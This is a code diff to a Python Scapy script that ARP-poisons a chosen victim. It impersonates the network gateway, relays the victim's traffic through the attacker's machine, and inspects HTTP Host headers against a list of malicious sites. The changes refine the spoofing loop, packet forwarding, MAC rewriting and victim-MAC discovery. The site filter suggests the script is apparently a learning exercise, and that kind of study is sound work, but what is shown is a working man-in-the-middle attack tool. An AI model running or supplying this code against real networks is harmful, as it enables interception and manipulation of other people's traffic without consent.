@@ -28,9 +28,10 @@ def http_parse(data):
 	str_url = ""
 	h = re.search("Host: (?P<url>.+)", data)
 	if h:
-		if h.group("url"): 
+		if h.group("url"):
 			str_url = h.group("url")
-			if re.findall('http://'+str_url, mal_site):
+			str_url = str_url[:len(str_url)-1]
+			if str_url in mal_site:
 				return str_url
 	return ""
 
@@ -40,12 +41,13 @@ class arp_poison(threading.Thread):
 		global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
 		while(True):
 				# Malicious ARP packet send			
-			sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3)
+			sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3, verbose=False)
 #			sendp(Ether(dst=gatewayMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=victimIP, pdst=gatewayIP, hwsrc=myMAC, hwdst=gatewayMAC), count=3)
 			time.sleep(1)
 
 def relay(packet):
 	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC, mal_site
+	mal_state = False
 	if packet.haslayer(IP):
 		if packet.haslayer(TCP):
 			del packet[TCP].chksum
@@ -53,24 +55,27 @@ def relay(packet):
 				payload = packet[TCP].load
 				if payload:
 					url = http_parse(payload)
-					print url
 					if url != "":
 						if url in mal_site :
 							print "Mal_site detected! : " + str(url)
-							return
+							mal_state = True
 		elif packet.haslayer(UDP):
 			del packet[UDP].chksum
 			del packet[UDP].len
 		del packet.chksum
 		del packet.len
 
-		if packet[Ether].src == victimMAC:
+		if (packet[Ether].src == victimMAC) and (mal_state == False):
 			if packet.haslayer(IP):
 				packet[Ether].src = victimMAC
+				packet[Ether].dst = gatewayMAC
 				packet[IP].src = victimIP
 				frags=fragment(packet,fragsize=1024)
 				for frag in frags:
 					sendp(frag, verbose=False)
+	elif (mal_state == False):
+		packet[Ether].src = victimMAC
+		sendp(packet, verbose=False)
 
 class to_gateway(threading.Thread):
 	def run(self):
@@ -96,9 +101,10 @@ def main():
 	temp = ""
 	ok = re.findall("\("+str(victimIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)	# ARP table MAC address parsing
 	gatewayMAC = re.findall("\("+str(gatewayIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)
-	
+
 	if gatewayMAC:
 		gatewayMAC = gatewayMAC[0]
+
 	else:
 		print "Can't get gatewayMAC."
 		sys.exit(1)
@@ -108,11 +114,10 @@ def main():
 
 	else:
 		try:
-			p = sr1(Ether(dst=broadcast, src=myMAC)/ARP(op=ARP.who_has, psrc=myIP, pdst=victimIP, hwsrc=myMAC, hwdst=broadcast2))		# Broadcast ARP packet to victimIP
-			temp = p[0].summary()		# get ARP response packet
-			ok = re.findall("ARP is at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2})", temp)	# victimMAC parsing
-			if ok:
-				victimMAC = ok[0]	# victimMAC allocation
+			arp_packet = Ether(dst=broadcast, src=myMAC, type=2054)/ARP(op=ARP.who_has, psrc=myIP, pdst=victimIP, hwsrc=myMAC, hwdst=broadcast2, ptype=2048, hwtype=1, hwlen=6, plen=4)
+			p = srp(arp_packet, verbose=False)		# Broadcast ARP packet to victimIP
+			if p:
+				victimMAC = p[0][0][1].src	# victimMAC allocation
 		except Exception as e:
 			print "Error occured! Can't load the victimMAC. : " + str(e)
 			sys.exit(1)
@@ -125,16 +130,13 @@ def main():
 	
 	tArp = arp_poison()
 	tGateway = to_gateway()
-#	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
 
 	tArp.start()
 	time.sleep(1)
 	tGateway.start()
-#	tVictim.start()
 
 	tArp.join()
 	tGateway.join()
-#	tVictim.join()
 
 	while True:
 		time.sleep(1000)
